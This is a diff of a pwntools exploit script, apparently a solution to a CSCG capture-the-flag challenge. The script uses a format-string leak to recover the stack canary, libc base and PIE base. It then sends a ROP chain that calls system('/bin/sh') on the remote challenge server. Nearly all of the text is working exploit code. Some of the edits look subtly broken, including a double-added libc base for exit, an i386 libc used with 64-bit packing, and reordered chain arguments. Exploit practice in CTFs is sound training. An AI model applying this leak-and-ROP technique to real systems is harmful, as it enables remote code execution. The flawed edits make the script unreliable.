@@ -22,15 +22,14 @@ main_offset = 0x1526
 pop_rdi_offset = 0x015d3
 
 binsh_offset = 0x1b6613
-system_offset = 0x554e0
-exit_offset = 0xe5fb0
-
+system_offset = 0x49a50 #0x554e0
+exit_offset = 0x3f090   #0xe5fb0
 flag = "CSCG{NOW_GET_VOLDEMORT}"
 leak = "AAAA %1$1lp %39$lp %44$lp BBBB"
 spell = "Expelliarmus\x00"
 pad = cyclic(0xff+0xf)
 
-
+#p = remote("172.17.0.3",1024)
 p = remote("hax1.allesctf.net",9102)
 #p = process("./pwn3")
 
@@ -42,11 +41,16 @@ tmp = p.recvuntil("spell:")
 
 print(tmp)
 
+libc = ELF('./libc6_2.30-0ubuntu2.1_i386.so', checksec=False)
+
 canary = int(tmp.split()[-7],16)
 libc_base = int(tmp.split()[-8],16) - libc_offset
-system = libc_base + system_offset
-bin_sh = libc_base + binsh_offset
-exit = libc_base + exit_offset
+libc.address = libc_base
+
+system = libc.sym['system']     #libc_base + system_offset
+bin_sh = next(libc.search('/bin/sh')) #libc_base + binsh_offset
+exit = libc_base + libc.sym['exit'] #libc_base + exit_offset
+
 pie_base = int(tmp.split()[-6],16) - pie_offset
 ret = pie_base + ret_offset
 pop_rdi = pie_base + pop_rdi_offset
@@ -62,5 +66,5 @@ log.info("AAAAAAAA_ret operation: {}".format(hex(ret)))
 
 raw_input("Exploit ?")
 idx = cyclic_find("cnaacoaa")
-p.sendline(spell+pad[:idx]+p64(canary)+RBP+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
+p.sendline(spell+pad[:idx]+p64(canary)+p64(exit)+p64(ret)+p64(pop_rdi)+p64(system)+p64(exit)+p64(bin_sh))#+p64(system))
 p.interactive()
